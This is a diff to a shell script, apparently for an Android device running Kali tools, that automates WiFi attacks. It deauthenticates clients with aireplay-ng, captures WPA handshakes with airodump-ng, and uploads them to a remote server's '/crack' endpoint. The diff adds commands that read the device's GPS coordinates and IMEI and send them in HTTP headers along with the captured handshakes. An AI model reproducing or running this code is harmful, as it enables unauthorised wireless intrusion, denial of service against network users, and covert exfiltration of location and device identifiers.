@@ -18,8 +18,10 @@ checkUtils() {
 sendHandshake() {
  # echo $1
  # echo $2
-
-  curl -i -X POST -H "Content-Type: multipart/form-data" -F "file=@$1" http://$2:9000/upload
+  long=`dumpsys location|grep "LongitudeDegrees: " | cut -d " |," -f13`
+  lat=`dumpsys location|grep "LatitudeDegrees: " | cut -d " |," -f13`
+  imei=`service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]'`
+  curl -i -X POST -H "imei: $imei" -H "lon: $long" -H "lat: $lat" -H "Content-Type: multipart/form-data" -F "file=@$1" http://$2:9000/crack
   if [[ $! == 0 ]]; then
     rm $1
   else
@@ -58,7 +60,6 @@ checkHandshakes() {
       sendHandshake /home/kali/shakes/shake1 $1
     fi
   fi
-
   echo ""
 }
 
@@ -87,7 +88,7 @@ active() {
     timeout 30 airodump-ng --bssid $bssid -w /home/kali/shakes wlan1 </dev/null >/dev/null &
     aireplay-ng -a $bssid -0 10 wlan1
     sleep 10
-    checkHandshakes
+    checkHandshakes $2
     rm /home/kali/shakes-* >/dev/null
   done </home/kali/shakesCollector-01.csv
 
@@ -95,9 +96,7 @@ active() {
 
 passive() {
   trap 'checkHandshakes;rm /home/kali/shakes-*' EXIT
-  #airmon-ng check kill
-  airmon-ng start wlan1
-  echo $2
+  airmon-ng start wlan1 > /dev/null
   echo "Start airodump.."
   timeout 60 airodump-ng -w /home/kali/shakes wlan1 </dev/null >/dev/null
   checkHandshakes $1
@@ -114,7 +113,8 @@ then
 fi
 if [[ $1 == "a"]]
   then
-    active
+    echo "Selected active mode"
+    active $2
 fi
 
 
